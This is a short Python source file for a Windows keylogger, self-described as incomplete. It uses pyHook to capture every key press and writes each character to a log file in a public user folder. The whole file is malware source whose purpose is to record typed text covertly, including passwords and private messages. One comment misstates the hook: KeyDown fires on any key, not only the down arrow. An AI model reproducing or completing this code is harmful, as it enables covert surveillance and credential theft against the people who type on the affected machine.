#Python Keylogger, incomplete, gives me weird import errors.
import pyHook
import pythoncom
import sys
import logging

file_log = 'C:\\Users\\Public_Documents\\log.txt' #Where our keys are recorded

def OnKeyboardEvent(event): #Defining function
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s') #Setting the config of the logger
    chr(event.Ascii)#Characters logged
    logging.log(10,chr(event.Ascii))#Defining the log
    return True

hooks_manager = pyHook.HookManager() #Allows us to hook windows events
hooks_manager.KeyDown = OnKeyboardEvent#Down arrow triggers function
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
